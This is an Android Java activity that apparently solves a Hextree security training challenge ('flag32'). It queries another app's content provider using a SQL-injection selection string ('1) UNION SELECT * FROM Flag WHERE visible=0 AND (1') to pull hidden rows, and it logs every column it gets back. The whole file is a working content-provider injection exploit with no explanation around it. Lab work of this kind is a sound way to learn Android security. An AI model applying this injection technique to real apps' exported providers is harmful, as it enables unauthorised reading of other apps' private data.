package com.android.zerohextree;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityFlag32Binding;

public class flag32 extends AppCompatActivity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        ContentResolver resolver = getContentResolver();
        Uri uri = Uri.parse("content://io.hextree.flag32/flags");
        String injectedSelection = "1) UNION SELECT * FROM Flag WHERE visible=0 AND (1";
        Cursor cursor = resolver.query(uri, null, injectedSelection, null, null);

        if (cursor != null) {
            // Retrieves all column names
            String[] columnNames = cursor.getColumnNames();
            while (cursor.moveToNext()) {
                for (String columnName : columnNames) {
                    String value = cursor.getString(cursor.getColumnIndexOrThrow(columnName));
                    Log.i("QueryFlag32", columnName + ": " + value);
                }
            }
            cursor.close();
        }

    }


}